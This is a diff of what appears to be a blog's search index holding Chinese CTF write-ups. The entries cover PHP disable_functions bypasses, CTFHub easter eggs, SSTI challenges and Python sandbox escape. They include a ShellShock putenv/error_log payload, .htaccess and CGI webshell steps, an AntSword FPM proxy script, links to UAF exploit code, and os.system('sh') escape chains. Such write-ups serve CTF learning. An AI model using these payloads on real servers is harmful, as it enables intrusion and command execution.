@@ -64,374 +64,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Bypass disable_function</title>
-    <url>/2022/05/Bypass%20disable_function/</url>
-    <content><![CDATA[ LD_PRELOAD
-时间紧 于是先采用最省时的方法
-先蚁剑连
-
-发现打不开 flag 文件
-要使用蚁剑插件绕过disabled function
-
-如果蚁剑插件市场打不开的话可以去 github 搜
-github 上有说明 按着他的安
-
-连上之后在蚁剑主页面右键 webshell 使用该插件
-按照步骤操作
-成功后把 webshell 地址改为 http://……/.antproxy.php
-在连上就能 tac 了
-tac /flag
- ShellShock
-进去发现连不上
-查了下大佬博客说是环境不正常
-原理如下
-
-如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在 shell 启动的时候才生效。
-
-脚本
-123456&lt;?php
-$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;
-putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);
-error_log(&quot;dmind&quot;,1);
-echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
-?&gt;
-用蚁剑传进去后
-浏览器访问这个文件即可在 1.txt 看到 flag
-
- Apache Mod CGI
-
-如果.htaccess 文件被攻击者修改的话，攻击者就可以利用 apache 的 mod_cgi 模块，直接绕过 PHP 的任何限制，来执行系统命令
-
-1.Mod CGI 就是把 PHP 做为 APACHE 一个内置模块，让 apache http 服务器本身能够支持 PHP 语言，不需要每一个请求都通过启动 PHP 解释器来解释 PHP. 2.它可以将 cgi-script 文件或者用户自定义标识头为 cgi-script 的文件通过服务器运行. 3.在.htaccess 文件中可定制用户定义标识头 4.添加 Options +ExecCGI，代表着允许使用 mod_cgi 模块执行 CGI 脚本 5.添加 AddHandler cgi-script .cgi，代表着包含.cgi 扩展名的文件都将被视为 CGI 程序
-
-条件
-
-必须是 apache 环境
-mod_cgi 已经启用
-必须允许.htaccess 文件，也就是说在 httpd.conf 中，要注意 AllowOverride 选项为 All，而不是 none
-必须有权限写.htaccess 文件
-
- 脚本：
-.htaccess
-1Options +ExecCGI AddHandler cgi-script .cgi
-shell.cgi
-12#!/bin/sh
-echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b
- 简单方法：
-蚁剑连
-还是那个插件 bypass！
-
- PHP-FPM
-
-FPM 是 fast-cgi 的协议解析器
-webserver 使用 cgi 协议封装好用户的请求发送给 FPM
-FPM 按照 cgi 的协议将 TCP 流解析成真正的数据
-
-
-蚁剑 bypass
-模式：FPM
-地址：127.0.0.1：9000 或 localhost：9000
-植入后修改 shell 地址为 http://……/.antproxy.php
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php
-function get_client_header(){
-    $headers=array();
-    foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
-        }
-    }
-    return $headers;
-}
-function header_callback($str){
-    return strtoupper($str[0]);
-}
-function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
-    $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
-        $ret=parseHeader($sResponse);
-    }
-    return $ret;
-}
-set_time_limit(120);
-$headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
-$port = 61921;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
-$timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
-};
-$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
-if(!$fp){
-    return false;
-}
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
-}
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
-}
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
-fputs($fp, $out);
-$response = &#39;&#39;;
-while($row=fread($fp, 4096)){
-    $response .= $row;
-}
-fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
-$response = substr($response, $pos+4);
-echo $response;
- UAF
- GC
-
-利用的是 PHP Garbage Collector 程序中的堆溢出触发
-
-题目附件
-其实蚁剑的 reference 就有这附件 包括后面的大佬脚本
-可以用蚁剑一把梭
-
-另附
-[大佬poc](https://github.com/mm0r1/exploits)
-UAF 的脚本里面都有
-tql！
- Json Serializer UAF
-
-漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843
-
-蚁剑一把梭
- Backtrace UAF
-
-漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047
-
- FFI
-PHP FFI 详解
-
-**disabled function:**
-pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
-
- iconv
-
-github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/
-https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80
-
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php
-function get_client_header(){
-    $headers=array();
-    foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
-        }
-    }
-    return $headers;
-}
-function header_callback($str){
-    return strtoupper($str[0]);
-}
-function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
-    $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
-        $ret=parseHeader($sResponse);
-    }
-    return $ret;
-}
-set_time_limit(120);
-$headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
-$port = 63947;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
-$timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
-};
-$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
-if(!$fp){
-    return false;
-}
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
-}
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
-}
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
-fputs($fp, $out);
-$response = &#39;&#39;;
-while($row=fread($fp, 4096)){
-    $response .= $row;
-}
-fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
-$response = substr($response, $pos+4);
-echo $response;
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[ 工具 彩蛋
-一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页
-抓包后发现不管哪一页 limit 都是 12 但 offset 在变化
-于是
-这样设置参数
-在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包
-在最后一行
- 首页 彩蛋
-api中间框内隐藏着两行字
-ctfhub{c18732f48a96c40d40a06e74b1305706}
-
- 题目入口 彩蛋
-在 web-ssrf 中间那一列的某些题传参错误时会出现
-详情见ctfhub-ssrfpost 最后一行介绍
- 公众号
-公众号彩蛋坑的一批！
-首先要先绑定
-然后点彩蛋
-它提示要回复正确的关键词
-我*#@%
-我回复过
-
-彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……
-
-到底没想到竟然是 flag
- 投稿提交 彩蛋
-只找到了前半部分
-分别在题目提交和 wp 提交页面的最后
-1234ctfhub{029e02eb3a1
-	e8c49b1132b5
-	15b652a5f3a8
-	62013}
-最后这个彩蛋剩余部分也没找到
-网上搜了下才明白：感谢 anweilx 的wp
-第一行是俩页面的最后有
-第二行是在俩页面源码 分别搜奖励 在上面那行一个是 base64 然后再转 url 一个是 hex 解码
-第三行是俩页面的图片隐写 丢进 winhex
-第四行有提示
-aes 256 ecb解码
- 其他彩蛋
-剩余皆可在对应页面搜索 egg 即可获得
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI模板注入</title>
-    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[
- [护网杯 2018]easy_tornado
-ssti 注入点在 msg
-注入49出现 orz 应该是有过滤
-1正常
-hint 里缺 cookie_secret
-该项在 handler.settings
-
-Handler 这个对象，Handler 指向的处理当前这个页面的 RequestHandler 对象
-RequestHandler 中并没有 settings 这个属性，与 RequestHandler 关联的 Application 对象（Requestion.application）才有 setting 这个属性
-handler 指向 RequestHandler
-而 RequestHandler.settings 又指向 self.application.settings
-所有 handler.settings 就指向 RequestHandler.application.settings 了！
-
-然后按 hint 里的 MD5 加密过后传参
-
-1?filename=/fllllllllllllag&amp;filehash=ff92d5623223cadc00efabfc7676f9fe
-filehash 不同 请自行加密
-
- [BJDCTF2020]The mystery of ip
-
-1234567891011121314151617181920212223242526272829303132333435&lt;?php
-	require_once(&#39;header.php&#39;);
-	require_once(&#39;./libs/Smarty.class.php&#39;);
-	$smarty = new Smarty();
-	if (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;]))
-	{
-		   $ip=$_SERVER[&#39;HTTP_CLIENT_IP&#39;];
-	}
-	elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))
-	{
-	    $ip=$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-	}
-	else
-	{
-	    $ip=$_SERVER[&#39;REMOTE_ADDR&#39;];
-	}
-	//$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);
-	echo &quot;&lt;div class=\&quot;container panel1\&quot;&gt;
-				&lt;div class=\&quot;row\&quot;&gt;
-				&lt;div class=\&quot;col-md-4\&quot;&gt;
-				&lt;/div&gt;
-				&lt;div class=\&quot;col-md-4\&quot;&gt;
-				&lt;div class=\&quot;jumbotron pan\&quot;&gt;
-					&lt;div class=\&quot;form-group log\&quot;&gt;
-						&lt;label&gt;&lt;h2&gt;Your IP is : &quot;;
-	$smarty-&gt;display(&quot;string:&quot;.$ip);
-	echo &quot;				&lt;/h2&gt;&lt;/label&gt;
-					&lt;/div&gt;
-				&lt;/div&gt;
-				&lt;/div&gt;
-				&lt;div class=\&quot;col-md-4\&quot;&gt;
-				&lt;/div&gt;
-				&lt;/div&gt;
-			&lt;/div&gt;&quot;;
-	?&gt;
-
- [BJDCTF2020]Cookie is so stable
-
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>SSTI</tag>
-        <tag>模板注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022 unctf wp</title>
     <url>/2022/12/2022unctf%20wp/</url>
     <content><![CDATA[ web
@@ -1255,12 +887,464 @@ flag get
         <category>web</category>
       </categories>
       <tags>
-        <tag>web</tag>
         <tag>unctf</tag>
+        <tag>web</tag>
         <tag>misc</tag>
         <tag>pwn</tag>
         <tag>re</tag>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2022/02/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[ 工具 彩蛋
+一开始的想法是工具一共有 8 页，想抓个包改下看看有没有第九页
+抓包后发现不管哪一页 limit 都是 12 但 offset 在变化
+于是
+这样设置参数
+在长度为 1000 到 6、7 千左右随便一个双击后 点击响应 看响应包
+在最后一行
+ 首页 彩蛋
+api中间框内隐藏着两行字
+ctfhub{c18732f48a96c40d40a06e74b1305706}
+
+ 题目入口 彩蛋
+在 web-ssrf 中间那一列的某些题传参错误时会出现
+详情见ctfhub-ssrfpost 最后一行介绍
+ 公众号
+公众号彩蛋坑的一批！
+首先要先绑定
+然后点彩蛋
+它提示要回复正确的关键词
+我*#@%
+我回复过
+
+彩蛋 关键词 egg ctfhub CTFHub 拿来把你 CTFer 自己人 ……
+
+到底没想到竟然是 flag
+ 投稿提交 彩蛋
+只找到了前半部分
+分别在题目提交和 wp 提交页面的最后
+1234ctfhub{029e02eb3a1
+	e8c49b1132b5
+	15b652a5f3a8
+	62013}
+最后这个彩蛋剩余部分也没找到
+网上搜了下才明白：感谢 anweilx 的wp
+第一行是俩页面的最后有
+第二行是在俩页面源码 分别搜奖励 在上面那行一个是 base64 然后再转 url 一个是 hex 解码
+第三行是俩页面的图片隐写 丢进 winhex
+第四行有提示
+aes 256 ecb解码
+ 其他彩蛋
+剩余皆可在对应页面搜索 egg 即可获得
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bypass disable_function</title>
+    <url>/2022/05/Bypass%20disable_function/</url>
+    <content><![CDATA[ LD_PRELOAD
+时间紧 于是先采用最省时的方法
+先蚁剑连
+
+发现打不开 flag 文件
+要使用蚁剑插件绕过disabled function
+
+如果蚁剑插件市场打不开的话可以去 github 搜
+github 上有说明 按着他的安
+
+连上之后在蚁剑主页面右键 webshell 使用该插件
+按照步骤操作
+成功后把 webshell 地址改为 http://……/.antproxy.php
+在连上就能 tac 了
+tac /flag
+ ShellShock
+进去发现连不上
+查了下大佬博客说是环境不正常
+原理如下
+
+如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在 shell 启动的时候才生效。
+
+脚本
+123456&lt;?php
+$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;
+putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);
+error_log(&quot;dmind&quot;,1);
+echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
+?&gt;
+用蚁剑传进去后
+浏览器访问这个文件即可在 1.txt 看到 flag
+
+ Apache Mod CGI
+
+如果.htaccess 文件被攻击者修改的话，攻击者就可以利用 apache 的 mod_cgi 模块，直接绕过 PHP 的任何限制，来执行系统命令
+
+1.Mod CGI 就是把 PHP 做为 APACHE 一个内置模块，让 apache http 服务器本身能够支持 PHP 语言，不需要每一个请求都通过启动 PHP 解释器来解释 PHP. 2.它可以将 cgi-script 文件或者用户自定义标识头为 cgi-script 的文件通过服务器运行. 3.在.htaccess 文件中可定制用户定义标识头 4.添加 Options +ExecCGI，代表着允许使用 mod_cgi 模块执行 CGI 脚本 5.添加 AddHandler cgi-script .cgi，代表着包含.cgi 扩展名的文件都将被视为 CGI 程序
+
+条件
+
+必须是 apache 环境
+mod_cgi 已经启用
+必须允许.htaccess 文件，也就是说在 httpd.conf 中，要注意 AllowOverride 选项为 All，而不是 none
+必须有权限写.htaccess 文件
+
+ 脚本：
+.htaccess
+1Options +ExecCGI AddHandler cgi-script .cgi
+shell.cgi
+12#!/bin/sh
+echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b
+ 简单方法：
+蚁剑连
+还是那个插件 bypass！
+
+ PHP-FPM
+
+FPM 是 fast-cgi 的协议解析器
+webserver 使用 cgi 协议封装好用户的请求发送给 FPM
+FPM 按照 cgi 的协议将 TCP 流解析成真正的数据
+
+
+蚁剑 bypass
+模式：FPM
+地址：127.0.0.1：9000 或 localhost：9000
+植入后修改 shell 地址为 http://……/.antproxy.php
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=&gt;$v){
+        if(strpos($k,&#39;HTTP_&#39;)===0){
+            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
+            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
+            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
+            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
+            if($k==&#39;Host&#39;) continue;
+            $headers[]=&quot;$k:$v&quot;;
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode(&quot;
+&quot;,$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+set_time_limit(120);
+$headers=get_client_header();
+$host = &quot;127.0.0.1&quot;;
+$port = 61921;
+$errno = &#39;&#39;;
+$errstr = &#39;&#39;;
+$timeout = 30;
+$url = &quot;/index.php&quot;;
+if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
+    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+};
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+$method = &quot;GET&quot;;
+$post_data = &quot;&quot;;
+if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
+    $method = &quot;POST&quot;;
+    $post_data = file_get_contents(&#39;php://input&#39;);
+}
+$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
+$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
+if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
+    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+}
+$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
+$out .= implode(&quot;\r\n&quot;,$headers);
+$out .= &quot;\r\n\r\n&quot;;
+$out .= &quot;&quot;.$post_data;
+fputs($fp, $out);
+$response = &#39;&#39;;
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$response = substr($response, $pos+4);
+echo $response;
+ UAF
+ GC
+
+利用的是 PHP Garbage Collector 程序中的堆溢出触发
+
+题目附件
+其实蚁剑的 reference 就有这附件 包括后面的大佬脚本
+可以用蚁剑一把梭
+
+另附
+[大佬poc](https://github.com/mm0r1/exploits)
+UAF 的脚本里面都有
+tql！
+ Json Serializer UAF
+
+漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843
+
+蚁剑一把梭
+ Backtrace UAF
+
+漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047
+
+ FFI
+PHP FFI 详解
+
+**disabled function:**
+pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
+
+ iconv
+
+github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/
+https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80
+
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=&gt;$v){
+        if(strpos($k,&#39;HTTP_&#39;)===0){
+            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
+            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
+            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
+            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
+            if($k==&#39;Host&#39;) continue;
+            $headers[]=&quot;$k:$v&quot;;
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode(&quot;
+&quot;,$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+set_time_limit(120);
+$headers=get_client_header();
+$host = &quot;127.0.0.1&quot;;
+$port = 63947;
+$errno = &#39;&#39;;
+$errstr = &#39;&#39;;
+$timeout = 30;
+$url = &quot;/index.php&quot;;
+if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
+    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+};
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+$method = &quot;GET&quot;;
+$post_data = &quot;&quot;;
+if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
+    $method = &quot;POST&quot;;
+    $post_data = file_get_contents(&#39;php://input&#39;);
+}
+$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
+$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
+if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
+    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+}
+$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
+$out .= implode(&quot;\r\n&quot;,$headers);
+$out .= &quot;\r\n\r\n&quot;;
+$out .= &quot;&quot;.$post_data;
+fputs($fp, $out);
+$response = &#39;&#39;;
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$response = substr($response, $pos+4);
+echo $response;
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PyJail python沙箱逃逸探究</title>
+    <url>/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
+    <content><![CDATA[ python 特性
+在 python 中，类均继承自object基类；
+ python 魔术方法
+
+__init__：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。
+__len__：返回对象的长度。
+__str__：返回对象的字符串表示。对一个对象a使用str(a)时，会尝试调用a.__str__()。相似地，还有__int__魔术方法也用于类型转换，不过较少使用。
+__getitem__：根据索引返回对象的某个元素。对一个对象a使用a[1]时，会尝试调用a.__getitem__(1)。
+__add__、__sub__、__mul__、__div__、__mod__：算术运算，加减乘除模。如对一个对象a使用a+b时，会尝试调用a.__add__(b)。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现__radd__、__rsub__、__rmul__、__rdiv__、__rmod__，如椭圆曲线上的点的倍点运算G -&gt; d * G，就可以通过实现__rmul__来实现。
+__and__，__or__、__xor__：逻辑运算，和算术运算类似；
+__eq__，__ne__、__lt__、__gt__、__le__、__ge__：比较运算，和算术运算类似；例如'贵州' &gt; '广西'，就会转而调用'贵州'.__gt__('广西')；
+__getattr__：对象是否含有某属性。如果我们对对象a所对应的类实现了该方法，那么在调用未实现的a.b时，就会转而调用a.__getattr__(b)。这也等价于用函数的方法调用：getattr(a, 'b')。有__getattr__，自然也有对应的__setattr__；
+__subclasses__：返回当前类的所有子类。一般是用在object类中，在object.__subclasses__()中，我们可以找到os模块中的类，然后再找到os，并且执行os.system，实现 RCE。
+
+ python 魔术属性
+
+
+__dict__：可以查看内部所有属性名和属性值组成的字典。
+
+
+__doc__：类的帮助文档。默认类均有帮助文档。对于自定义的类，需要我们自己实现。
+
+
+__class__：返回当前对象所属的类。如''.__class__会返回&lt;class 'str'&gt;。拿到类之后，就可以通过构造函数生成新的对象，如''.__class__(4396)，就等价于str(4396)，即'4396'；
+
+
+__base__：返回当前类的基类。如str.__base__会返回&lt;class 'object'&gt;；
+
+
+ 其他内置函数和变量
+
+dir：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过getattr来拿到目标方法。
+chr、ord：字符与 ASCII 码转换函数，能帮我们绕过一些 WAF
+globals：返回所有全局变量的函数；
+locals：返回所有局部变量的函数；
+__import__：载入模块的函数。例如import os等价于os = __import__('os')；
+__name__：该变量指示当前运行环境位于哪个模块中。如我们 python 一般写的if __name__ == '__main__':，就是来判断是否是直接运行该脚本。如果是从另外的地方 import 的该脚本的话，那__name__就不为__main__，就不会执行之后的代码。更多参考这里；
+__builtins__：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如str、chr、ord、dict、dir等。在 pyjail 的沙箱中，往往__builtins__被置为None，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到__builtins__，再__import__('os').system('sh')进行 RCE；
+__file__：该变量指示当前运行代码所在路径。如open(__file__).read()就是读取当前运行的 python 文件代码。需要注意的是，该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量；
+_：该变量返回上一次运行的 python 语句结果。需要注意的是，该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量。
+
+ WAF
+ 过滤[]
+使用pop、__getitem__ 代替
+例如：a.__getitem__(0)、{&quot;a&quot;: 1}.pop(&quot;a&quot;)
+或使用 next 等指针指向(类似无参 RCE 特殊函数遍历)
+需要去别的是 python 需要使用迭代器iter(object[, sentinel])作为传入函数
+ 过滤字符
+ chr() 函数构造字符
+ 利用输出
+1str(().__class__.__new__)[i]+……
+12&gt;&gt;&gt;print(str(().__class__.__new__))
+&lt;built-in method __new__ of type object at 0x00007FFF01FE8AB0&gt;
+ 过滤数字
+
+0：int(bool([]))、Flase、len([])、any(())
+1：int(bool([&quot;&quot;]))、True、all(())、int(list(list(dict(a၁=())).pop()).pop())
+len：len(str({}.keys))
+1.0：float(True)
+-1：~0
+
+ 过滤特殊字符
+str 被过滤type('')()、format() 即可。同理，int、list 都可以用 type 构造出来。
+ Non-ASCII Identifiers
+在 python3 中支持 Non-ASCII Identifies 并且所有都会被转换成 unicode 的 NFKC（也就是标准模式）。我们可以用斜体或者花体各种各样的与标准字母相像的来进行导包操作。
+
+ 参考链接
+PyJail python 沙箱逃逸探究·总览
+pyjail-学习总结【CV】 | TWe1v3
+
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>python</tag>
+        <tag>沙箱逃逸</tag>
+        <tag>PyJail</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI模板注入</title>
+    <url>/2022/10/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[
+ [护网杯 2018]easy_tornado
